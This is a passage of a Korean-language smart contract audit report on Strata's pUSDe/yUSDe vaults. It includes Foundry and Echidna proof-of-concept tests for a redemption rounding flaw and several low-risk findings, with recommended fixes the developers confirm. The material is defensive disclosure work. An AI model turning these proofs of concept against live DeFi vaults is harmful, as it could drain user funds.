    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_rounding() public {
        uint256 userDeposit = 100 ether;

        // fund users
        USDe.mint(alice, userDeposit);
        USDe.mint(bob, userDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(userDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(userDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 1_000 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe (reported): %s", aliceRedeemed_USDe_reported);
        console2.log("Alice redeemed USDe (actual): %s", aliceRedeemed_USDe_actual);

        console2.log("Bob redeemed pUSDe (reported): %s", bobRedeemed_pUSDe_reported);
        console2.log("Bob redeemed pUSDe (actual): %s", bobShares_pUSDe);
        console2.log("Bob redeemed sUSDe: %s", bobRedeemed_sUSDe);
        console2.log("Bob redeemed USDe: %s", bobRedeemed_USDe);

        // post-redemption assertions
        assertEq(
            aliceRedeemed_USDe_reported,
            aliceRedeemed_USDe_actual,
            "Alice's reported and actual USDe redemption amounts should match"
        );

        assertGe(
            bobRedeemed_pUSDe_reported,
            bobShares_pUSDe,
            "Bob should redeem at least the same amount of pUSDe as his original deposit"
        );

        assertGe(
            bobRedeemed_USDe, userDeposit, "Bob should redeem at least the same amount of USDe as his initial deposit"
        );

        assertLe(
            aliceRedeemed_USDe_actual,
            userDeposit,
            "Alice should redeem no more than the same amount of USDe as her initial deposit"
        );
    }
}
```

이 불일치를 극대화하기 위해 다음 Echidna 최적화 테스트를 실행할 수도 있습니다:

```solidity
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {BaseSetup} from "@chimera/BaseSetup.sol";
import {CryticAsserts} from "@chimera/CryticAsserts.sol";
import {vm} from "@chimera/Hevm.sol";

import {pUSDeVault} from "contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "contracts/predeposit/yUSDeVault.sol";
import {MockUSDe} from "contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "contracts/test/MockStakedUSDe.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// echidna . --contract CryticRoundingTester --config echidna_rounding.yaml --format text --workers 16 --test-limit 1000000
contract CryticRoundingTester is BaseSetup, CryticAsserts {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe USDe;
    MockStakedUSDe sUSDe;
    pUSDeVault pUSDe;
    yUSDeVault yUSDe;

    address owner;
    address alice = address(uint160(uint256(keccak256(abi.encodePacked("alice")))));
    address bob = address(uint160(uint256(keccak256(abi.encodePacked("bob")))));
    uint256 severity;

    constructor() payable {
        setup();
    }

    function setup() internal virtual override {
        owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function target(uint256 aliceDeposit, uint256 bobDeposit, uint256 sUSDeYieldAmount) public {
        aliceDeposit = between(aliceDeposit, 1, 100_000 ether);
        bobDeposit = between(bobDeposit, 1, 100_000 ether);
        sUSDeYieldAmount = between(sUSDeYieldAmount, 1, 500_000 ether);
        precondition(aliceDeposit <= 100_000 ether);
        precondition(bobDeposit <= 100_000 ether);
        precondition(sUSDeYieldAmount <= 500_000 ether);

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        eq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        eq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(owner);
            USDe.mint(owner, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        // optimize
        if (aliceRedeemed_USDe_actual > aliceDeposit) {
            uint256 diff = aliceRedeemed_USDe_actual - aliceDeposit;
            if (diff > severity) {
                severity = diff;
            }
        }
    }

    function echidna_opt_severity() public view returns (uint256) {
        return severity;
    }
}
```

Config:
```yaml
testMode: "optimization"
prefix: "echidna_"
coverage: true
corpusDir: "echidna_rounding"
balanceAddr: 0x1043561a8829300000
balanceContract: 0x1043561a8829300000
filterFunctions: []
cryticArgs: ["--foundry-compile-all"]
deployer: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
contractAddr: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
shrinkLimit: 100000
```

Output:
```bash
echidna_opt_severity: max value: 444330
```

**권장 완화 방안:** 올림하는 `previewWithdraw()`를 호출하는 대신 내림하는 `convertToShares()`를 호출하십시오:

```solidity
function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Up);
}

function convertToShares(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Down);
}
```

**Strata:** 커밋 [59fcf23](https://github.com/Strata-Money/contracts/commit/59fcf239a9089d14f02621a7f692bcda6c85690e)에서 수정됨.

**Cyfrin:** 확인함. 수령인에게 전송할 `sUSDe`는 이제 내림하는 `convertToShares()`를 사용하여 계산됩니다.

\clearpage
## 저위험 (Low Risk)


### 상속되는 업그레이드 가능한 컨트랙트는 스토리지 충돌을 방지하기 위해 ERC7201 네임스페이스 스토리지 레이아웃이나 스토리지 갭을 사용해야 함

**설명:** 프로토콜에는 다른 컨트랙트가 상속하는 업그레이드 가능한 컨트랙트가 있습니다. 이러한 컨트랙트는 다음 중 하나를 사용해야 합니다:
* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) 네임스페이스 스토리지 레이아웃 - [예시](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)
* 스토리지 갭(storage gaps) (이것은 [더 오래되고 더 이상 선호되지 않는](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) 방법임)

이상적인 완화책은 모든 업그레이드 가능한 컨트랙트가 ERC7201 네임스페이스 스토리지 레이아웃을 사용하는 것입니다.

위의 두 가지 기술 중 하나를 사용하지 않으면 업그레이드 중에 스토리지 충돌이 발생할 수 있습니다.

**Strata:** 커밋 [98068bd](https://github.com/Strata-Money/contracts/commit/98068bd9d9d435b37ce8f855f45b61d37aa274db)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeDepositor::deposit_viaSwap`에서 스왑 데드라인에 `block.timestamp`를 사용하는 것은 효과적이지 않음

**설명:** [스왑 데드라인에 `block.timestamp`를 사용하는 것](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline)은 효과적이지 않습니다. `block.timestamp`는 트랜잭션이 포함되는 블록이 되므로 스왑이 이런 식으로는 만료될 수 없기 때문입니다.

대신 현재 `block.timestamp`를 오프체인에서 가져와 스왑 트랜잭션의 입력으로 전달해야 합니다.

**Strata:** 커밋 [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7)에서 수정됨.

**Cyfrin:** 확인함. 호출자는 이제 기본 스왑 데드라인을 재정의할 수 있습니다.


### `pUSDeDepositor::deposit_viaSwap`의 하드 코딩된 슬리피지는 서비스 거부를 초래할 수 있음

**설명:** `pUSDeDepositor::deposit_viaSwap`의 [하드 코딩된 슬리피지](https://dacian.me/defi-slippage-attacks#heading-hard-coded-slippage-may-freeze-user-funds)는 서비스 거부로 이어질 수 있으며 극적인 경우에는 [사용자 자금을 잠글](https://x.com/0xULTI/status/1875220541625528539) 수도 있습니다.

**권장 완화 방안:** 슬리피지 매개변수는 오프체인에서 계산하여 스왑의 입력으로 제공해야 합니다.

**Strata:** 커밋 [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7)에서 수정됨.

**Cyfrin:** 확인함. 호출자는 이제 기본 슬리피지를 재정의할 수 있습니다.


### 표준 `IERC20::approve` 대신 `SafeERC20::forceApprove` 사용

**설명:** 표준 `IERC20::approve` 대신 다양한 잠재적 토큰을 다룰 때는 [`SafeERC20::forceApprove`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L101-L108)를 사용하십시오:
```solidity
predeposit/yUSDeDepositor.sol
58:        pUSDe.approve(address(yUSDe), amount);

predeposit/pUSDeVault.sol
178:        USDe.approve(address(sUSDe), USDeAssets);

predeposit/pUSDeDepositor.sol
86:            asset.approve(address(vault), amount);
98:        sUSDe.approve(address(pUSDe), amount);
110:        USDe.approve(address(pUSDe), amount);
122:        token.approve(swapInfo.router, amount);
```

**Strata:** 커밋 [f258bdc](https://github.com/Strata-Money/contracts/commit/f258bdcc49b87a2f8658b150bc3e3597a5187816)에서 수정됨.

**Cyfrin:** 확인함.


### `MetaVault::redeem`이 `pUSDeVault`에서 `USDe`를 상환하려고 할 때 `ERC4626Upgradeable::withdraw`를 잘못 호출함

**설명:** `MetaVault::deposit`, `MetaVault::mint`, `MetaVault::withdraw`가 모두 해당하는 `IERC4626` 함수를 호출하는 것과 달리, `MetaVault::redeem`은 `pUSDeVault`에서 `USDe`를 상환하려고 할 때 실수로 `ERC4626Upgradeable::withdraw`를 호출합니다:

```solidity
function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
    if (token == asset()) {
        return withdraw(shares, receiver, owner);
    }
    ...
}
```

**파급력:** `MetaVault::redeem`의 동작은 `token`이 `USDe`로 지정되었는지 아니면 다른 지원되는 볼트 토큰 중 하나로 지정되었는지에 따라 예상되는 동작과 다릅니다.

**권장 완화 방안:**
```diff
    function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
        if (token == asset()) {
--          return withdraw(shares, receiver, owner);
++          return redeem(shares, receiver, owner);
        }
        ...
    }
```

**Strata:** 커밋 [7665e7f](https://github.com/Strata-Money/contracts/commit/7665e7f3cd44d8a025f555737677d2014f4ac8a8)에서 수정됨.

**Cyfrin:** 확인함.


### 중복된 볼트가 `assetsArr`에 추가될 수 있음

**설명:** `MetaVault::addVault`는 `onlyOwner` 제어자에 의해 보호되지만, 주어진 `vaultAddress`를 인수로 사용하여 이 함수를 호출할 수 있는 횟수에는 제한이 없습니다:

```solidity
    function addVault(address vaultAddress) external onlyOwner {
        addVaultInner(vaultAddress);
    }

    function addVaultInner (address vaultAddress) internal {
        TAsset memory vault = TAsset(vaultAddress, EAssetType.ERC4626);
        assetsMap[vaultAddress] = vault;
@>      assetsArr.push(vault);

        emit OnVaultAdded(vaultAddress);
    }
```

이런 시나리오에서 볼트는 `assetsArr` 배열 내에서 중복됩니다. `pUSDeVault::startYieldPhase`에서 호출될 때 `MetaVault::redeemMetaVaults`의 핵심 상환 로직은 예상대로 계속 작동합니다. 주어진 볼트 주소에 대한 두 번째 반복 동안 컨트랙트 잔액은 단순히 0이 되므로 상환은 건너뛰고 `assetsMap` 항목은 다시 기본값으로 다시 작성되며 중복 요소는 배열에서 제거됩니다:

```solidity
    function removeVaultAndRedeemInner (address vaultAddress) internal {
        // Redeem
        uint balance = IERC20(vaultAddress).balanceOf(address(this));
@>      if (balance > 0) {
@>          IERC4626(vaultAddress).redeem(balance, address(this), address(this));
        }

        // Clean
        TAsset memory emptyAsset;
@>      assetsMap[vaultAddress] = emptyAsset;
        uint length = assetsArr.length;
        for (uint i = 0; i < length; i++) {
            if (assetsArr[i].asset == vaultAddress) {
                assetsArr[i] = assetsArr[length - 1];
@>              assetsArr.pop();
                break;
            }
        }
    }

    /// @dev Internal method to redeem all assets from supported vaults
    /// @notice Iterates through all supported vaults and redeems their assets for the base token
    function redeemMetaVaults () internal {
        while (assetsArr.length > 0) {
@>          removeVaultAndRedeemInner(assetsArr[0].asset);
        }
    }
```

그러나 주어진 볼트가 지원되는 볼트 목록에서 제거되면, `MetaVault::removeVault`는 중복 항목 제거를 허용하지 않습니다. `removeVaultAndRedeemInner()` 호출에서 매핑 상태가 이미 `address(0)`로 덮어쓰여졌기 때문에 후속 시도에서 `requireSupportedVault()` 호출이 실패하기 때문입니다:

```solidity
    function requireSupportedVault(address token) internal view {
@>      address vaultAddress = assetsMap[token].asset;
        if (vaultAddress == address(0)) {
            revert UnsupportedAsset(token);
        }
    }

    function removeVault(address vaultAddress) external onlyOwner {
@>      requireSupportedVault(vaultAddress);
        removeVaultAndRedeemInner(vaultAddress);

        emit OnVaultRemoved(vaultAddress);
    }
```

이 결과는 소유자의 의도에 따라 달라집니다:
* 볼트 지원을 유지하려는 경우, 소유자가 중복된 볼트를 제거하려고 시도하면 지정된 자산이 지원되는 볼트인 것에 의존하는 모든 `MetaVault` 기능이 되돌려집니다.
* 볼트를 완전히 제거하려는 경우, 이것은 불가능합니다. 하지만 후속 입금도 불가능하므로 영향은 즉각적인 것이 아니라 수익 창출 단계로 전환하는 동안의 상환으로 제한됩니다.

**파급력:** 볼트 자산이 의도한 것보다 늦게 상환될 수 있으며 사용자가 일시적으로 자금을 인출하지 못할 수 있습니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 `pUSDeVault.t.sol`에 포함해야 합니다:

```solidity
function test_duplicateVaults() public {
    pUSDe.addVault(address(eUSDe));
    pUSDe.removeVault(address(eUSDe));
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));
    vm.expectRevert();
    pUSDe.removeVault(address(eUSDe));
}
```

**권장 완화 방안:** 주어진 볼트가 이미 추가된 경우 되돌립니다.

**Strata:** 커밋 [787d1c7](https://github.com/Strata-Money/contracts/commit/787d1c72e86308897f06af775ed30b8dbef4cf2b)에서 수정됨.

**Cyfrin:** 확인함.


### `MetaVault::addVault`는 동일한 기본 자산을 강제해야 함

**설명:** 추가 볼트를 지원할 때 `MetaVault::addVault`는 지원되는 새 볼트가 자신과 동일한 기본 자산을 가지고 있는지 강제해야 합니다. 그렇지 않으면:
* 새로 지원되는 볼트에 동일한 기본 자산이 없으므로 `redeemRequiredBaseAssets`가 예상대로 작동하지 않습니다.
* `MetaVault::depositedBase`가 손상되며, 특히 기본 자산 토큰이 다른 소수점 정밀도를 사용하는 경우 더욱 그렇습니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_vaultSupportedWithDifferentUnderlyingAsset() external {
    // create ERC4626 vault with different underlying ERC20 asset
    MockUSDe differentERC20 = new MockUSDe();
    MockERC4626 newSupportedVault = new MockERC4626(differentERC20);

    // verify pUSDe doesn't have same underlying asset as new vault
    assertNotEq(pUSDe.asset(), newSupportedVault.asset());

    // but still allows it to be added
    pUSDe.addVault(address(newSupportedVault));

    // this breaks `MetaVault::redeemRequiredBaseAssets` since
    // the newly supported vault doesn't have the same base asset
}
```

**권장 완화 방안:** `MetaVault::addVaultInner` 변경:
```diff
    function addVaultInner (address vaultAddress) internal {
+       IERC4626 newVault = IERC4626(vaultAddress);
+       require(newVault.asset() == asset(), "Vault asset mismatch");
```

**Strata:** 커밋 [9e64f09](https://github.com/Strata-Money/contracts/commit/9e64f09af6eb927c9c736796aeb92333dbb72c18), [706c2df](https://github.com/Strata-Money/contracts/commit/706c2df3f2caf6651b1d8e858beb5097dbd7d066)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::startYieldPhase`는 지원되는 볼트를 지원 대상에서 제거하지 않아야 하거나 수익 창출 단계에 진입하면 새로운 지원 볼트를 방지해야 함

**설명:** `pUSDeVault::startYieldPhase`의 의도는 기존 지원되는 볼트의 자산을 `USDe`로 변환한 다음 볼트의 총 `USDe`를 `sUSDe` 볼트에 스테이킹하는 것입니다.

그러나 이것은 결국 `MetaVault::removeVaultAndRedeemInner`를 호출하기 때문에 지원되는 모든 볼트는 자산이 변환된 후에도 제거됩니다.

하지만 수익 창출 단계 중에도 새 볼트를 계속 추가할 수 있으므로 이 시점에 지원되는 모든 볼트를 제거하는 것은 의미가 없습니다.

**파급력:** 컨트랙트 소유자는 이전에 활성화된 모든 지원 볼트를 다시 추가해야 하며, 이 작업이 완료될 때까지 모든 사용자 입금이 되돌려집니다.

**개념 증명 (Proof Of Concept):**
```solidity
function test_supportedVaultsRemovedWhenYieldPhaseEnabled() external {
    // supported vault prior to yield phase
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin triggers yield phase on main vault
    pUSDe.startYieldPhase();

    // supported vault was removed when initiating yield phase
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));

    // but can be added back in?
    pUSDe.addVault(address(eUSDe));
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // what was the point of removing it if it can be re-added
    // and used again during the yield phase?
}
```

**권장 완화 방안:** `pUSDeVault::startYieldPhase`를 호출할 때 모든 지원되는 볼트를 제거하지 마십시오. 자산을 `USDe`로 변환하되 볼트 자체가 계속 지원되고 향후 입금을 수락하도록 허용하십시오.

또는 수익 창출 단계 동안 지원되는 볼트를 추가하는 것을 허용하지 마십시오 (수익 창출 단계가 활성화될 때 추가되는 sUSDe는 제외). 이 경우 수익 창출 단계를 활성화할 때 제거하는 것은 괜찮지만, 수익 창출 단계가 활성화되면 추가를 허용하지 않는 코드를 추가하십시오.

**Strata:** 커밋 [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190)에서 수익 창출 단계 동안 새로운 지원 볼트 추가를 더 이상 허용하지 않음으로써 수정됨.

**Cyfrin:** 확인함.


### 수익 창출 단계 동안 예치된 지원 볼트 자산을 `sUSDe` 스테이크로 복리화할 방법이 없음

**설명:** 수익 창출 단계가 활성화되면 `pUSDeVault`는 여전히 새로운 지원 볼트 추가 및 지원되는 볼트를 통한 입금을 허용합니다.

그러나 `sUSDe`가 아닌 지원되는 볼트의 경우, 기본 토큰인 `USDe`를 인출하여 `pUSDeVault` 볼트에서 사용하는 `sUSDe` 볼트 스테이크로 복리화(compound)할 방법이 없습니다.

**권장 완화 방안:** 수익 창출 단계가 활성화되면 `sUSDe` 외에 지원되는 볼트를 추가하는 것을 허용하지 않거나, 기본 토큰을 인출하여 메인 스테이크로 복리화하는 기능을 구현하십시오.

**Strata:** 커밋 [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190)에서 수익 창출 단계 동안 새로운 지원 볼트 추가를 더 이상 허용하지 않음으로써 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::maxWithdraw`는 인출 일시 중지를 고려하지 않아 EIP-4626을 위반하고 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있음

**설명:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626)은 `maxWithdraw`에 대해 다음과 같이 명시합니다:
> 전역 및 사용자별 제한을 모두 고려해야 하며(MUST), 인출이 완전히 비활성화된 경우(일시적이더라도) 0을 반환해야 합니다(MUST).

`pUSDeVault::maxWithdraw`는 인출 일시 중지를 고려하지 않아 EIP-4626을 위반하며, 이는 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있습니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_maxWithdraw_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // reverts as maxWithdraw returns user1AmountInMainVault even though
    // attempting to withdraw would revert
    assertEq(pUSDe.maxWithdraw(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxWithdraw says:
    // MUST factor in both global and user-specific limits,
    // like if withdrawals are entirely disabled (even temporarily) it MUST return 0
}
```

**권장 완화 방안:** 인출이 일시 중지된 경우 `maxWithdraw`는 0을 반환해야 합니다. `maxWithdraw`의 재정의는 일시 중지가 구현된 `PreDepositVault`에서 수행되어야 합니다.

**Strata:** 커밋 [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::maxDeposit`는 입금 일시 중지를 고려하지 않아 EIP-4626을 위반하고 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있음

**설명:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626)은 `maxDeposit`에 대해 다음과 같이 명시합니다:
> 전역 및 사용자별 제한을 모두 고려해야 하며(MUST), 입금이 완전히 비활성화된 경우(일시적이더라도) 0을 반환해야 합니다(MUST).

`pUSDeVault::maxDeposit`는 입금 일시 중지를 고려하지 않아 EIP-4626을 위반하며, 이는 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있습니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_maxDeposit_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // reverts as maxDeposit returns uint256.max even though
    // attempting to deposit would revert
    assertEq(pUSDe.maxDeposit(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxDeposit says:
    // MUST factor in both global and user-specific limits,
    // like if deposits are entirely disabled (even temporarily) it MUST return 0.
}
```

**권장 완화 방안:** 입금이 일시 중지된 경우 `maxDeposit`는 0을 반환해야 합니다. `maxDeposit`의 재정의는 일시 중지가 구현된 `PreDepositVault`에서 수행되어야 합니다.

**Strata:** 커밋 [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::maxMint`는 민트 일시 중지를 고려하지 않아 EIP-4626을 위반하고 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있음

**설명:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626)은 `maxMint`에 대해 다음과 같이 명시합니다:
> 전역 및 사용자별 제한을 모두 고려해야 하며(MUST), 민트가 완전히 비활성화된 경우(일시적이더라도) 0을 반환해야 합니다(MUST).

`pUSDeVault::maxMint`는 민트 일시 중지를 고려하지 않아 EIP-4626을 위반하며, 이는 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있습니다. `MetaVault::mint`는 `_deposit`을 사용하므로 입금이 일시 중지되면 민트도 일시 중지됩니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_maxMint_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // should revert here as maxMint should return 0
    // since deposits are paused and `MetaVault::mint` uses `_deposit`
    assertEq(pUSDe.maxMint(user1), type(uint256).max);

    // attempt to mint to show the error
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    // reverts with DepositsDisabled since `MetaVault::mint` uses `_deposit`
    uint256 user1MainVaultShares = pUSDe.mint(user1AmountInMainVault, user1);
    vm.stopPrank();

    // https://eips.ethereum.org/EIPS/eip-4626 maxMint says:
    // MUST factor in both global and user-specific limits,
    // like if mints are entirely disabled (even temporarily) it MUST return 0.
}
```

**권장 완화 방안:** 입금이 일시 중지된 경우 `maxMint`는 0을 반환해야 합니다. `maxMint`의 재정의는 일시 중지가 구현된 `PreDepositVault`에서 수행되어야 합니다.

